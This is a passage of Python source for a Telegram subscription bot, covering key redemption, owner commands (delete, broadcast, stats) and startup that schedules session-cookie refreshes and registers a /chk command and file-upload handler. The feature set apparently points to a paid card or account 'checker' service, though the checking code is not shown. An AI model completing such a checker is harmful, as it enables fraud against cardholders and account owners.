    all_keys[key_to_redeem]["redeemed_by"] = user_id

    await save_json_data(USERS_FILE, all_users, USERS_LOCK)
    await save_json_data(KEYS_FILE, all_keys, KEYS_LOCK)

    await update.message.reply_text(
        f"🎉 Success! Your {key_data['tier']} subscription is active.\n"
        f"It will expire on: {expiration_date.strftime('%Y-%m-%d %H:%M UTC')}"
    )

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to delete a user's subscription."""
    if update.effective_user.id != OWNER_ID: return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("Usage: /delkey <user_id>")
        return

    target_user_id = context.args[0]
    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    if target_user_id in all_users:
        del all_users[target_user_id]
        await save_json_data(USERS_FILE, all_users, USERS_LOCK)
        await update.message.reply_text(f"Subscription for user {target_user_id} has been deleted.")
    else:
        await update.message.reply_text("No subscription found for that user.")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to send a message to all subscribed users."""
    if update.effective_user.id != OWNER_ID: return
    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    message = update.message.text.split(" ", 1)[1]
    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    sent_count = 0
    failed_count = 0
    for user_id in all_users.keys():
        try:
            await context.bot.send_message(chat_id=int(user_id), text=message, parse_mode="HTML")
            sent_count += 1
            await asyncio.sleep(0.1) # Avoid hitting rate limits
        except Exception:
            failed_count += 1

    await update.message.reply_text(f"📢 Broadcast sent to {sent_count} users. Failed for {failed_count}.")

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Owner command to view bot statistics."""
    if update.effective_user.id != OWNER_ID: return

    all_users = await load_json_data(USERS_FILE, USERS_LOCK)
    all_keys = await load_json_data(KEYS_FILE, KEYS_LOCK)

    active_users = sum(1 for u in all_users.values() if datetime.fromisoformat(u['expiration']) > datetime.now(timezone.utc))
    total_users = len(all_users)

    total_keys = len(all_keys)
    used_keys = sum(1 for k in all_keys.values() if k['used'])

    await update.message.reply_text(
        f"<b>📊 Bot Statistics</b>\n\n"
        f"<b>Users:</b>\n"
        f"- Active Subscriptions: {active_users}\n"
        f"- Total Users in DB: {total_users}\n\n"
        f"<b>Keys:</b>\n"
        f"- Used Keys: {used_keys}\n"
        f"- Total Keys Generated: {total_keys}",
        parse_mode="HTML"
    )

# =================================================================================
# --- Bot Initialization ---
# =================================================================================

async def post_init(application: Application):
    """Tasks to run after the bot is initialized but before it starts polling."""
    await setup_data_files()
    global SESSION_COOKIES
    SESSION_COOKIES = await load_cookies()
    logger.info("Initial cookies loaded from file.")

    # Schedule the cookie refresh job
    application.job_queue.run_repeating(
        refresh_cookies,
        interval=COOKIE_REFRESH_INTERVAL,
        first=10 # Start first refresh 10s after launch
    )
    logger.info("Cookie refresh job scheduled.")
    await application.bot.send_message(OWNER_ID, "🤖 Bot has started successfully!")


def main():
    """The main function to set up and run the bot."""
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE" or OWNER_ID == 123456789:
        logger.error("!!! IMPORTANT: Please set your BOT_TOKEN and OWNER_ID at the top of the script. !!!")
        return

    try:
        application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

        # Add all command and message handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("chk", chk))
        application.add_handler(CommandHandler("redeem", redeem))
        application.add_handler(CommandHandler("stop", stop))

        # Owner commands
        application.add_handler(CommandHandler("genkey", genkey))
        application.add_handler(CommandHandler("delkey", delkey))
        application.add_handler(CommandHandler("broadcast", broadcast))
        application.add_handler(CommandHandler("updatecookies", update_cookies))
        application.add_handler(CommandHandler("stats", stats))

        # Handlers for files and callbacks
        application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
        application.add_handler(CallbackQueryHandler(button_callback))

        logger.info("Bot is starting to poll...")
        application.run_polling(allowed_updates=Update.ALL_TYPES)

    except Exception as e:
        logger.critical(f"Bot startup failed: {e}", exc_info=True)

if __name__ == "__main__":
    main()